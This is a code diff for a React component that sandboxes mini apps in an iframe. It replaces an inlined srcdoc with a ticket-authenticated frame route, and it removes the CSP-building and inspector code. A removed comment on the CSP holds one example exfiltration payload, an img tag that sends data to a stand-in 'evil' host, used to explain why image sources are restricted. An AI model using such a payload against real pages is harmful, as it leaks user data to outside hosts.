@@ -1,15 +1,24 @@
 'use client';
 
 /**
- * Runs a built mini app inside a sandboxed iframe. The app's bundle is fetched
- * (authenticated, same-origin) and INLINED into the iframe's srcdoc, so the
- * iframe runs with an opaque origin (sandbox="allow-scripts", NO
- * allow-same-origin) — it can't read host cookies/DOM/storage. Its only channel
- * is postMessage to this parent, which brokers tool + sqlite calls server-side.
+ * Runs a built mini app inside a sandboxed iframe. The iframe NAVIGATES to a
+ * server-rendered frame document (`${apiBase}/frame`) instead of receiving an
+ * inlined srcdoc — a real `src` navigation cannot be dropped the way a late
+ * `.srcdoc` assignment could, the sandbox CSP rides a response header, and the
+ * document is curl-able (see app-frame-html.ts, which builds it).
  *
- * Theme parity: we inline the parent's already-compiled CSS and copy the active
- * theme attrs (class + data-color-theme) onto the iframe <html>, so the app
- * matches the product look (incl. dark mode + colour theme) with no network.
+ * The navigation itself can carry no credential (the sandboxed iframe has an
+ * opaque origin ⇒ no cookies; an iframe src can't attach a bearer), so this
+ * parent — which CAN authenticate — first mints a seconds-lived signed ticket
+ * from `${apiBase}/frame-ticket` and passes it in the frame URL (`?t=`).
+ *
+ * The iframe stays sandbox="allow-scripts" (NO allow-same-origin) — it can't
+ * read host cookies/DOM/storage. Its only channel is postMessage to this
+ * parent, which brokers tool + sqlite calls server-side.
+ *
+ * Theme parity: the active theme attrs (class + data-color-theme) ride the
+ * frame URL and are baked into the document's <html>; later host theme
+ * changes are pushed into the running app via the postMessage theme sync.
  */
 import { useCallback, useEffect, useRef, useState } from 'react';
 import {
@@ -21,253 +30,6 @@ import {
 } from './app-bridge-protocol';
 
 type Status = 'loading' | 'ready' | 'nobuild' | 'error';
-
-/** Serialize every same-origin stylesheet the host has loaded (Tailwind output
- *  + theme vars). Cross-origin sheets throw on .cssRules — skipped. Cached: the
- *  app's CSS doesn't change within a session. */
-/** The shared-runtime import map (specifier → hashed `/app-runtime` URL),
- *  fetched once per session. The app's bundle imports react/react-dom/the kit/
- *  @host as BARE specifiers (the bundler marks them external); this map — injected
- *  into the srcdoc — resolves them to the ONE shared runtime, so the browser
- *  fetches + parses React once across every app + reload instead of each app
- *  re-bundling it. manifest.json is public + same-origin (see middleware). */
-let importMapPromise: Promise<string> | null = null;
-function loadImportMap(): Promise<string> {
-  if (!importMapPromise) {
-    importMapPromise = fetch('/app-runtime/manifest.json')
-      .then((r) => {
-        if (!r.ok) throw new Error(`app-runtime manifest ${r.status}`);
-        return r.json() as Promise<{ imports: Record<string, string> }>;
-      })
-      .then((m) => JSON.stringify({ imports: m.imports }))
-      .catch((e) => {
-        importMapPromise = null; // let the next mount retry
-        throw e;
-      });
-  }
-  return importMapPromise;
-}
-
-let cssCache: string | null = null;
-function captureHostCss(): string {
-  if (cssCache !== null) return cssCache;
-  let out = '';
-  for (const sheet of Array.from(document.styleSheets)) {
-    try {
-      for (const rule of Array.from(sheet.cssRules)) out += rule.cssText + '\n';
-    } catch {
-      /* cross-origin sheet — skip */
-    }
-  }
-  cssCache = out;
-  return out;
-}
-
-/** The host stylesheet markup to drop into the iframe <head>. We LINK the same
- *  stylesheet files the host already loaded (so the browser reuses its cached,
- *  already-parsed copy instead of re-parsing ~400 KB of inlined CSS per srcdoc)
- *  and inline only the small dynamic <style> tags (theme vars next-themes
- *  injects, etc.). Falls back to a full inline capture when the host exposes no
- *  <link> stylesheets (e.g. some dev setups inline everything). */
-function hostStyleMarkup(): { markup: string; styleHrefs: string[] } {
-  const links = Array.from(document.querySelectorAll<HTMLLinkElement>('link[rel="stylesheet"]'))
-    .map((l) => l.href)
-    .filter(Boolean);
-  if (links.length === 0) return { markup: `<style>${captureHostCss()}</style>`, styleHrefs: [] };
-  const inline = Array.from(document.querySelectorAll('style'))
-    .map((s) => s.textContent || '')
-    .join('\n');
-  const linkTags = links.map((href) => `<link rel="stylesheet" href="${href}" />`).join('\n');
-  return { markup: `${linkTags}\n<style>${inline}</style>`, styleHrefs: links };
-}
-
-// Host-injected "inspect mode" overlay. Lives in the iframe but is NOT part of
-// the app bundle, so it works on every app with no rebuild and stays a host
-// concern. When the parent posts {kind:'inspect',on:true}, hovering outlines the
-// nearest [data-app-region] ancestor and clicking locks it (clicking the same
-// one clears it). The locked region is posted back as {kind:'select'}; the
-// parent feeds it to Appsmith as focusRegionIds. Esc exits. Pure DOM, defensive.
-const INSPECTOR = `
-(function(){
-  var on=false, locked=null, hovered=null, lbl=null;
-  function regionOf(el){
-    while(el && el.nodeType===1 && el!==document.body){
-      if(el.getAttribute && el.hasAttribute('data-app-region')) return el;
-      el=el.parentElement;
-    }
-    return null;
-  }
-  function q(id){ try{ return id ? document.querySelector('[data-app-region="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]') : null; }catch(e){ return null; } }
-  function label(){
-    if(!lbl){
-      lbl=document.createElement('div');
-      lbl.style.cssText='position:fixed;z-index:2147483647;pointer-events:none;display:none;font:500 11px/1.4 ui-sans-serif,system-ui,sans-serif;padding:2px 6px;border-radius:4px;background:var(--ring,#3b82f6);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.35);white-space:nowrap;';
-      document.body.appendChild(lbl);
-    }
-    return lbl;
-  }
-  function paintLocked(){
-    var prev=document.querySelectorAll('[data-app-locked]');
-    for(var i=0;i<prev.length;i++){ prev[i].removeAttribute('data-app-locked'); prev[i].style.outline=''; prev[i].style.outlineOffset=''; }
-    var el=q(locked);
-    if(el){ el.setAttribute('data-app-locked','1'); el.style.outline='2px solid var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
-  }
-  function clearHover(){
-    if(hovered && !hovered.hasAttribute('data-app-locked')){ hovered.style.outline=''; hovered.style.outlineOffset=''; }
-    hovered=null;
-    if(lbl) lbl.style.display='none';
-  }
-  function onMove(e){
-    if(!on) return;
-    var el=regionOf(e.target);
-    if(el===hovered) return;
-    clearHover();
-    if(!el) return;
-    hovered=el;
-    if(!el.hasAttribute('data-app-locked')){ el.style.outline='2px dashed var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
-    var r=el.getBoundingClientRect(), L=label();
-    L.textContent=el.getAttribute('data-app-region');
-    L.style.display='block';
-    L.style.left=Math.max(2,r.left)+'px';
-    L.style.top=Math.max(2,r.top-20)+'px';
-  }
-  function onClick(e){
-    if(!on) return;
-    var el=regionOf(e.target);
-    if(!el) return;
-    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
-    var id=el.getAttribute('data-app-region');
-    locked=(locked===id)?null:id;
-    clearHover(); paintLocked();
-    window.parent.postMessage({ v:1, kind:'select', regionId:locked, label:locked }, '*');
-    onMove(e);
-  }
-  function setOn(v){ on=v; document.body.style.cursor=v?'crosshair':''; if(!v) clearHover(); }
-  window.addEventListener('message', function(e){
-    if(e.source!==window.parent) return;
-    var m=e.data; if(!m||m.v!==1) return;
-    if(m.kind==='inspect'){ setOn(!!m.on); return; }
-    if(m.kind==='select'){ locked=m.regionId||null; clearHover(); paintLocked(); return; }
-    if(m.kind==='theme'){ var h=document.documentElement; h.className=m.cls||''; if(m.colorTheme){ h.setAttribute('data-color-theme', m.colorTheme); } else { h.removeAttribute('data-color-theme'); } return; }
-  });
-  document.addEventListener('mousemove', onMove, true);
-  document.addEventListener('click', onClick, true);
-  document.addEventListener('keydown', function(e){ if(on && e.key==='Escape'){ setOn(false); window.parent.postMessage({v:1,kind:'inspect',on:false},'*'); } });
-})();
-`;
-
-function buildSrcDoc(
-  bundleCode: string,
-  appCss: string,
-  importMapJson: string,
-  viewport: boolean,
-): string {
-  const html = document.documentElement;
-  const cls = html.className || '';
-  const colorTheme = html.dataset.colorTheme
-    ? ` data-color-theme="${html.dataset.colorTheme}"`
-    : '';
-  const { markup: styleMarkup, styleHrefs } = hostStyleMarkup();
-  // CSP: the app may only render — NO network of its own. `connect-src 'none'`
-  // blocks fetch/XHR/WebSocket, but img/font loads are network too, so they're
-  // held to inline sources (data:/blob:) plus the HOST ORIGIN only — a wildcard
-  // would be an exfil channel (`<img src="https://evil/?d=…">`) despite
-  // connect-src 'none'. Same-origin images are deliberately allowed (Mantle is
-  // single-tenant; a request to our own server leaks nothing) so apps can show
-  // brain images and share attachments (`/s/<token>/a/<fileId>`). Note the
-  // opaque origin sends no cookies, so session-authed image routes still 401 —
-  // token-authed share paths are the ones that actually resolve.
-  // The app's only egress is the postMessage bridge to the parent, which
-  // brokers tool + sqlite calls server-side. Inline style + script are ours.
-  //
-  // The iframe has an opaque origin, so CSP `'self'` matches NOTHING here; we
-  // name the host origin + path explicitly, scoped tight so neither is a general
-  // egress channel: `script-src` allows ONLY `<origin>/app-runtime/` (the shared
-  // React/kit/host runtime the import map points at); `style-src` allows ONLY
-  // `<origin>/_next/` (the host's compiled stylesheet, linked not inlined).
-  //
-  // `font-src` MIRRORS `style-src`, and must keep mirroring it. Allowing the
-  // stylesheet while refusing the faces it declares is self-defeating: the host
-  // sheet carries KaTeX's `@font-face` rules (katex.min.css is imported by the
-  // client layout), whose URLs resolve to `<origin>/_next/static/media/…`. With
-  // `font-src data:` alone every mini-app logged a CSP violation on load and any
-  // app rendering maths fell back to system fonts. This widens nothing: it
-  // permits fonts from exactly the path already trusted for styles.
-  const origin = location.origin;
-  // The style allowlist follows the stylesheets the host page ACTUALLY links:
-  // /_next/ on the owner app, /share-runtime/ on the /s surface. Hardcoding
-  // /_next/ alone CSP-blocked the linked sheet on shares, so every shared app
-  // rendered unstyled. Each linked sheet contributes its same-origin directory
-  // (a directory source also matches subpaths, e.g. katex's fonts/). font-src
-  // mirrors style-src (see above) plus /fonts/ — the share surface inlines the
-  // owner-font @font-face rules, whose URLs live under /fonts/library/.
-  const styleDirs = new Set([`${origin}/_next/`]);
-  for (const href of styleHrefs) {
-    try {
-      const u = new URL(href);
-      if (u.origin === origin) styleDirs.add(u.origin + u.pathname.replace(/[^/]*$/, ''));
-    } catch {
-      /* non-URL href — skip */
-    }
-  }
-  const styleSrc = [...styleDirs].join(' ');
-  const csp =
-    `default-src 'none'; style-src 'unsafe-inline' ${styleSrc}; ` +
-    `script-src 'unsafe-inline' ${origin}/app-runtime/; ` +
-    `img-src data: blob: ${origin}; font-src data: ${styleSrc} ${origin}/fonts/; ` +
-    "connect-src 'none'; base-uri 'none'; form-action 'none'";
-  return `<!doctype html>
-<html class="${cls}"${colorTheme}>
-<head>
-<meta charset="utf-8" />
-<meta http-equiv="Content-Security-Policy" content="${csp}" />
-<script type="importmap">${importMapJson}</script>
-${styleMarkup}
-<style>${/* Per-app compiled utilities (bundle/css) — classes the app's own source
-   uses that the host sheet never scanned. After the host styles so its @layer
-   order is already established. The `</` guard keeps CSS content (arbitrary
-   values can hold strings) from closing the tag; the app already runs its own
-   JS in this iframe, so this is markup hygiene, not a security boundary. */
-appCss.replace(/<\//g, '<\\/')}</style>
-<style>/* Paint the iframe canvas with the theme background, NOT transparent: a
-   sandboxed (opaque-origin) iframe renders WHITE where it's transparent, so any
-   gap between the app content and the iframe height showed a white strip. With
-   the themed background, any such gap is invisible (matches the app + host). */
-html,body{margin:0;background:var(--background)}#root{padding:0}
-/* Themed scrollbars for the WHOLE app. The host only styles scrollbars behind an
-   opt-in .scrollbar-thin class, so an app's own scroll containers otherwise fall
-   back to the default wide OS scrollbar with a white/grey track that clashes with
-   the theme. Apply the thin, theme-token look to every scroller inside the iframe
-   (scoped here, so the host is untouched). Vars resolve from the inlined theme. */
-*{scrollbar-width:thin;scrollbar-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent) transparent}
-::-webkit-scrollbar{width:10px;height:10px}
-::-webkit-scrollbar-track{background:transparent}
-::-webkit-scrollbar-thumb{background-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent);border-radius:6px;border:2px solid transparent;background-clip:padding-box}
-::-webkit-scrollbar-thumb:hover{background-color:color-mix(in oklab,var(--muted-foreground) 50%,transparent);background-clip:padding-box}
-::-webkit-scrollbar-corner{background:transparent}
-${
-  viewport
-    ? `/* Viewport frame: the iframe IS the viewport, so viewport-height utilities
-   are real and the app owns its own layout + scrolling. Full-height plumbing
-   so h-full works from the root down. */
-html,body,#root{height:100%}
-body{overflow:auto}`
-    : `/* Card frame: the app is embedded in an auto-sized iframe with no real
-   viewport, so viewport-height utilities would inflate it into a tall,
-   mostly-empty box (a small app leaves a big blank area below). Collapse them
-   to content height — the iframe then hugs the actual content. Belt-and-braces
-   with the authoring rule that tells Appsmith not to use these. */
-.min-h-screen,.min-h-dvh,.min-h-svh,.min-h-lvh{min-height:0!important}
-.h-screen,.h-dvh,.h-svh,.h-lvh{height:auto!important}`
-}</style>
-</head>
-<body class="bg-background text-foreground">
-<div id="root"></div>
-<script type="module">${bundleCode}</script>
-<script>${INSPECTOR}</script>
-</body>
-</html>`;
-}
 
 export function AppSandbox({
   appId,
@@ -339,15 +101,15 @@ export function AppSandbox({
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [status, setStatus] = useState<Status>('loading');
   const [height, setHeight] = useState(320);
-  // The built srcdoc, held in state so the iframe is RENDERED with it (keyed
-  // per attempt). Assigning `.srcdoc` to an iframe already in the DOM raced
-  // the element's initial about:blank navigation — under a busy first page
-  // load the srcdoc navigation was silently dropped, leaving the attribute
-  // set but the document blank and the share pinned on "Loading…" forever.
-  // Creating a fresh element that carries srcdoc before insertion can't race.
-  const [doc, setDoc] = useState<{ html: string; gen: number } | null>(null);
+  // The frame URL (ticket included), held in state so the iframe is RENDERED
+  // with its src (keyed per attempt) — the element is created carrying the
+  // navigation, which cannot be dropped the way a late srcdoc write could.
+  const [frameSrc, setFrameSrc] = useState<{ url: string; gen: number } | null>(null);
   const genRef = useRef(0);
-  // One automatic remount before giving up (see the ready watchdog below).
+  // Watchdog retry counter: bumping it re-runs the ticket effect (a fresh
+  // ticket AND a fresh iframe — the old ticket may have expired by then).
+  const [attempt, setAttempt] = useState(0);
+  // One automatic retry before giving up (see the ready watchdog below).
   const retriedRef = useRef(false);
   // Whether THIS bundle load ever reached ready — distinguishes a boot crash
   // (error before ready ⇒ load failure) from a runtime error after boot.
@@ -386,8 +148,8 @@ export function AppSandbox({
 
   // Mirror the host's live theme (the <html> class + data-color-theme) into the
   // iframe so a dark/light or colour-theme switch restyles a RUNNING app without
-  // a reload — the srcdoc only baked in the theme as of mount. Sync once on ready
-  // (covers a change between srcdoc build and mount), then on every host change.
+  // a reload — the frame document only baked in the theme as of mint. Sync once
+  // on ready (covers a change between mint and mount), then on every host change.
   useEffect(() => {
     if (status !== 'ready') return;
     const send = () => {
@@ -504,20 +266,19 @@ export function AppSandbox({
     return () => window.removeEventListener('message', onMessage);
   }, [handleRequest, frame]);
 
-  // Ready watchdog: a bundle that FETCHES fine but never boots (module-level
+  // Ready watchdog: a frame that NAVIGATES fine but never boots (module-level
   // throw, an import-map chunk failing inside the opaque iframe) leaves status
   // on 'loading' forever — the fetch error paths below never see it. Give the
-  // app a generous window to post `ready`, then remount the iframe once (a
-  // fresh element re-runs the whole srcdoc; recovers any residual dropped
-  // navigation), and if that also times out surface the error state + report
+  // app a generous window to post `ready`, then retry once with a fresh
+  // ticket + iframe, and if that also times out surface the error state + report
   // a load failure so a hub-surface parent can fall back instead of pinning
   // members on a spinner.
   useEffect(() => {
-    if (status !== 'loading' || doc === null) return;
+    if (status !== 'loading' || frameSrc === null) return;
     const t = setTimeout(() => {
       if (!retriedRef.current) {
         retriedRef.current = true;
-        setDoc((d) => (d ? { ...d, gen: ++genRef.current } : d));
+        setAttempt((a) => a + 1);
         return;
       }
       setStatus('error');
@@ -525,25 +286,23 @@ export function AppSandbox({
       cbRef.current.onLoadFailure?.();
     }, 10_000);
     return () => clearTimeout(t);
-  }, [status, doc]);
+  }, [status, frameSrc]);
 
-  // Fetch the bundle and (re)render into the iframe.
+  // A NEW load target (not a watchdog retry) gets its retry budget back.
+  useEffect(() => {
+    retriedRef.current = false;
+  }, [apiBase, reloadKey, frame]);
+
+  // Mint a frame ticket and point the iframe at the frame route. The ticket
+  // request is what authenticates (cookie or the split client's bearer via
+  // `fetcher`); the frame navigation itself carries only the signed ticket.
   useEffect(() => {
     let cancelled = false;
     setStatus('loading');
-    setDoc(null);
+    setFrameSrc(null);
     everReadyRef.current = false;
-    retriedRef.current = false;
-    Promise.all([
-      doFetch(`${apiBase}/bundle`),
-      // Per-app stylesheet; 404 (pre-CSS build) or a network hiccup degrades
-      // to host-stylesheet-only rendering, exactly the pre-feature behaviour.
-      doFetch(`${apiBase}/bundle/css`)
-        .then((r) => (r.ok ? r.text() : ''))
-        .catch(() => ''),
-      loadImportMap(),
-    ])
-      .then(async ([r, appCss, importMap]) => {
+    doFetch(`${apiBase}/frame-ticket`, { method: 'POST' })
+      .then(async (r) => {
         if (cancelled) return;
         if (r.status === 404) {
           setStatus('nobuild');
@@ -552,16 +311,19 @@ export function AppSandbox({
         }
         if (!r.ok) {
           setStatus('error');
-          cbRef.current.onError?.(`bundle load failed (${r.status})`);
+          cbRef.current.onError?.(`app frame ticket failed (${r.status})`);
           cbRef.current.onLoadFailure?.();
           return;
         }
-        const code = await r.text();
+        const { ticket } = (await r.json()) as { ticket: string };
         if (cancelled) return;
-        setDoc({
-          html: buildSrcDoc(code, appCss, importMap, frame === 'viewport'),
-          gen: ++genRef.current,
-        });
+        // Theme parity at mint time; live changes ride the postMessage sync.
+        const h = document.documentElement;
+        const q = new URLSearchParams({ t: ticket });
+        if (h.className) q.set('cls', h.className);
+        if (h.dataset.colorTheme) q.set('ct', h.dataset.colorTheme);
+        if (frame === 'viewport') q.set('vp', '1');
+        setFrameSrc({ url: `${apiBase}/frame?${q.toString()}`, gen: ++genRef.current });
       })
       .catch((err) => {
         if (cancelled) return;
@@ -572,7 +334,7 @@ export function AppSandbox({
     return () => {
       cancelled = true;
     };
-  }, [apiBase, reloadKey, frame, doFetch]);
+  }, [apiBase, reloadKey, frame, doFetch, attempt]);
 
   const isViewport = frame === 'viewport';
   return (
@@ -599,13 +361,13 @@ export function AppSandbox({
           {isViewport ? 'Couldn’t load the app.' : 'Couldn’t load the app preview.'}
         </div>
       )}
-      {doc !== null && (
+      {frameSrc !== null && (
         <iframe
-          key={doc.gen}
+          key={frameSrc.gen}
           ref={iframeRef}
           title={isViewport ? 'App' : 'App preview'}
           sandbox="allow-scripts"
-          srcDoc={doc.html}
+          src={frameSrc.url}
           className={
             status === 'ready' ? (isViewport ? 'block h-full w-full' : 'block w-full') : 'hidden'
           }
